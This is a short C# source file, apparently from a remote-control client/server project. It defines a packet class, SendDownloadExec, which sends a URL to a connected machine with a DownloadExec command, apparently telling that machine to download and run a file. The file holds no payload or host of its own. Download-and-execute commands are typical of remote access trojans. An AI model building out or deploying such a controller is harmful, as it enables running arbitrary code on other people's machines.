namespace ConsoleClient.Packets
{
    using MarrySocket.MClient;
    using NetworkObjects;
    using System;

    public class SendDownloadExec : ISendPacket
    {
        private String url;


        public SendDownloadExec(String pURL)
        {
            url = pURL;

        }

        public void Send(ServerSocket serverSocket)
        {
            DownloadExec downloadExec = new DownloadExec(url);

            serverSocket.SendObject(0, downloadExec);
        }
    }
}
